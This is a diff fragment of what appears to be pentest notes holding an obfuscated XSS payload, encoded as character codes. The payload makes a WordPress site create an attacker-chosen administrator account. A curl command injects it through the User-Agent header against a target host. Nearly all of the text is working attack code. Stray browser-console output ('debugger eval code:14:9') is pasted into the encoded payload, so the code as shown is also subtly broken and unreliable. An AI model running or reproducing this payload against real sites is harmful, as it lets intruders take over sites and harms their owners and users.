 118,97,114,32,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,60,85,83,69,82,78,65,77,69,62,38,101,109,97,105,108,61,60,69,77,65,73,76,62,38,112,97,115,115,49,61,60,80,65,83,83,87,79,82,68,62,38,112,97,115,115,50,61,60,80,65,83,83,87,79,82,68,62,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59 debugger eval code:14:9
 ```
 
 ###### Execution
 
-```c
+```console
 curl -i http://<RHOST> --user-agent "<script>eval(String.fromCharCode(118,97,114,32,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,60,85,83,69,82,78,65,77,69,62,38,101,109,97,105,108,61,60,69,77,65,73,76,62,38,112,97,115,115,49,61,60,80,65,83,83,87,79,82,68,62,38,112,97,115,115,50,61,60,80,65,83,83,87,79,82,68,62,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59 debugger eval code:14:9
 ))</script>" --proxy 127.0.0.1:8080
 ```
